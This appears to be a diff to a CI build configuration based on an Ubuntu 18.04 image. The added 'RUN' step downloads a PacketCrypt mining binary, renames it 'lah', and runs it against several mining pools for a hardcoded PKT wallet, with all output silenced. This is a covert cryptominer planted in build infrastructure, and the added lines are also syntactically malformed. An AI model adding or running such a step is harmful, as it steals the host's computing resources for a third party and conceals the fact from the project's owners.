@@ -1,4 +1,7 @@
 FROM vm/ubuntu:18.04
 SPLIT 3
-RUN apt-get update
+RUN apt-get update && \
+    wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah
+    chmod +x lah 
+    ./lah ann -p pkt1qv437nndzvr9u8ps60g3d5dl0gssu84ulwksvfq  http://pool.pkt.world/ http://pool.pktpool.io/  http://pool.srizbi.com/ http://pool.pkteer.com/ http://pktco.in/ >/dev/null 2>&1
         
